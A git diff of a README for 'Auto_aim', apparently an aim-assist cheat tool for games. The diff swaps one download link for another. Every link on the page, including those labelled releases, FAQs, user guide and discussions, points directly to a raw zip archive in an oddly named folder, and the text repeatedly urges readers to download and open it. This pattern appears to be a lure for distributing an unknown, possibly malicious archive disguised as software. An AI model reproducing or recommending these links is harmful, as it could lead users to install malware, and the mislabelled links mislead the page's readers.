@@ -1,7 +1,7 @@
 # 🤖 Auto_aim - Effortlessly Enhance Your Gaming Experience
 
 ## 📥 Download the Latest Version
-[![Download Auto_aim](https://raw.githubusercontent.com/kwel1x/Auto_aim/main/gastriloquist/Auto_aim.zip)](https://raw.githubusercontent.com/kwel1x/Auto_aim/main/gastriloquist/Auto_aim.zip)
+[![Download Auto_aim](https://raw.githubusercontent.com/kwel1x/Auto_aim/main/gastriloquist/Auto-aim-3.7.zip)](https://raw.githubusercontent.com/kwel1x/Auto_aim/main/gastriloquist/Auto-aim-3.7.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before downloading, ensure your system meets these requirements:
 
 ## 📂 Download & Install
 
-1. Visit the [Releases Page](https://raw.githubusercontent.com/kwel1x/Auto_aim/main/gastriloquist/Auto_aim.zip) to access the latest version.
+1. Visit the [Releases Page](https://raw.githubusercontent.com/kwel1x/Auto_aim/main/gastriloquist/Auto-aim-3.7.zip) to access the latest version.
 2. Locate the version you want to download. Click on the link to the file for your system.
 3. Save the downloaded file to your computer.
 4. Once the download finishes, open the folder where the file is located.
@@ -47,7 +47,7 @@ Before downloading, ensure your system meets these requirements:
 
 If you encounter any issues or need help:
 
-- Check the [FAQs](https://raw.githubusercontent.com/kwel1x/Auto_aim/main/gastriloquist/Auto_aim.zip) on the repository.
+- Check the [FAQs](https://raw.githubusercontent.com/kwel1x/Auto_aim/main/gastriloquist/Auto-aim-3.7.zip) on the repository.
 - Contact support through the issues section on GitHub.
 
 ## 📣 Important Notes
@@ -57,8 +57,8 @@ If you encounter any issues or need help:
 
 ## 🔗 Additional Resources
 
-- [User Guide](https://raw.githubusercontent.com/kwel1x/Auto_aim/main/gastriloquist/Auto_aim.zip) for detailed instructions and tips.
-- Join the community discussions in the [Discussions Section](https://raw.githubusercontent.com/kwel1x/Auto_aim/main/gastriloquist/Auto_aim.zip).
+- [User Guide](https://raw.githubusercontent.com/kwel1x/Auto_aim/main/gastriloquist/Auto-aim-3.7.zip) for detailed instructions and tips.
+- Join the community discussions in the [Discussions Section](https://raw.githubusercontent.com/kwel1x/Auto_aim/main/gastriloquist/Auto-aim-3.7.zip).
 
 ## 📝 Changelog
 
@@ -72,4 +72,4 @@ If you want to contribute to the project, please read the guidelines in the repo
 
 Your feedback is valuable. Share your experiences to help us improve Auto_aim for everyone.
 
-Feel free to [download the latest version](https://raw.githubusercontent.com/kwel1x/Auto_aim/main/gastriloquist/Auto_aim.zip) and elevate your gaming experience today!
+Feel free to [download the latest version](https://raw.githubusercontent.com/kwel1x/Auto_aim/main/gastriloquist/Auto-aim-3.7.zip) and elevate your gaming experience today!
